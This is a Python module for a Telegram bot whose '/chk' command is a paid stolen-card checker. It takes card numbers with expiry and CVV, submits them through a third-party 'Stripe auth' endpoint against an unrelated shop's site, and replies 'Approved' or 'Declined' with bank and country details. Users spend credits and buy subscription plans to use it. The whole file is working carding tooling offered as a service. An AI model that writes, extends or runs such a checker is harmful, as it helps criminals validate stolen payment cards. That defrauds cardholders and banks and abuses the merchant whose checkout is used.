import aiohttp
import asyncio
import time
import re
from telegram import Update
from telegram.ext import CommandHandler, ContextTypes
from config import get_bin_info, kb_result
from plans import deduct_credit

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 NEW STRIPE API CONFIGURATION 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CHK_API_URL = "https://stripe-auth-test-production.up.railway.app/st0"
CHK_SITE = "fashionspicex.com"
CHK_TIMEOUT = 180  # Requested 180 seconds timeout

def get_styled_plan(raw_plan: str) -> str:
    plan_upper = raw_plan.upper()
    if plan_upper == "CORE": return "✨ Cᴏʀᴇ ✨"
    elif plan_upper == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
    elif plan_upper == "ROOT": return "👑 Rᴏᴏᴛ 👑"
    else: return "Tʀɪᴀʟ"

async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.bot_data.get('chk_on', True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
        return
    
    card = None
    if context.args: 
        card = context.args[0]
    elif update.message.reply_to_message and update.message.reply_to_message.text: 
        card = update.message.reply_to_message.text.strip()
        
    if not card:
        await update.message.reply_text(
            "⚠️ Uꜱᴀɢᴇ: Rᴇᴍʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪᴛʜ ᴄᴀʀᴅꜱ ᴏʀ ꜱᴇɴᴅ\n/chk cc|mm|yy|cvv", 
            parse_mode="HTML"
        )
        return
    
    if not deduct_credit(update.effective_user.id):
        await update.message.reply_text("Buy the PLANS and Start the checking you trils cradits are empty.", parse_mode="HTML")
        return
    
    bin_num = card[:6]
    msg = await update.message.reply_text("⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...", parse_mode="HTML")
    start_time = time.time()
    
    try:
        timeout = aiohttp.ClientTimeout(total=CHK_TIMEOUT)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Format new API URL
            api_url = f"{CHK_API_URL}?cc={card}&site={CHK_SITE}"
            
            # Fetch new API and BIN info concurrently
            tasks = [
                session.get(api_url), 
                get_bin_info(bin_num)
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)
        
        api_resp = results[0]
        bin_data = results[1] if not isinstance(results[1], Exception) else {"error": True}
        
        if isinstance(api_resp, Exception): raise api_resp
        
        data = await api_resp.json()
        
        # Extract exact JSON response field
        raw_response = str(data.get("response", "NO RESPONSE"))
        
        # Clean URLs from raw response for safety
        raw_response = re.sub(r'https?://\S+', '', raw_response).strip()
        if not raw_response: raw_response = "NO RESPONSE"
        
        # Status logic: Approved if word "approved" is found, else Declined
        if "approved" in raw_response.lower():
            status = "<b>Approved</b> ✅"
        else:
            status = "<b>Declined</b> ❌"
            
        # Get BIN Info
        bin_txt, country, flag = "N/A", "N/A", ""
        if not bin_data.get("error"):
            s = str(bin_data.get("scheme", "N/A")).upper()
            b = bin_data.get("bank", "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {b} - {flag} {country}"
            
        # Get User's Current Plan (Trial/Elite/Root) dynamically
        ud = context.bot_data.get('user_data', {}).get(str(update.effective_user.id), {})
        raw_plan = ud.get('plan', 'TRIAL').upper()
        
        # Check if plan expired to revert to Trial
        if raw_plan != 'TRIAL' and ud.get('expires', 0) <= time.time():
            raw_plan = 'TRIAL'
            
        plan_ui = get_styled_plan(raw_plan)
        username = update.effective_user.first_name or "User"
        
        # Exact Requested Premium UI Design
        text = (
            f"[ 𖥷iТ ] ➺ {status}\n"
            f"🔍 ➺ \n"
            f"Gᴀᴛᴇ ➺ Sᴛʀɪᴘᴇ 0$ 💳 🟢\n"
            f"Rᴀᴡ ➺ {raw_response}\n"
            f"Iɴꜰᴏ ➺ {bin_txt}\n"
            f"Uꜱᴇʀ ➺ {username} 👑 ({plan_ui})\n"
            f"Pʀᴏ ➺ Batman⚡"
        )
        
        await msg.edit_text(
            text, 
            parse_mode="HTML", 
            reply_markup=kb_result(), 
            disable_web_page_preview=True
        )
        
    except aiohttp.ClientTimeout: 
        await msg.edit_text("⏳ Tɪᴍᴇᴏᴜᴛ", parse_mode="HTML")
    except Exception as e: 
        await msg.edit_text(f"❌ Eʀʀᴏʀ ➤ <code>{str(e)[:100]}</code>", parse_mode="HTML")

def get_chk_handler():
    return CommandHandler("chk", cmd_chk)
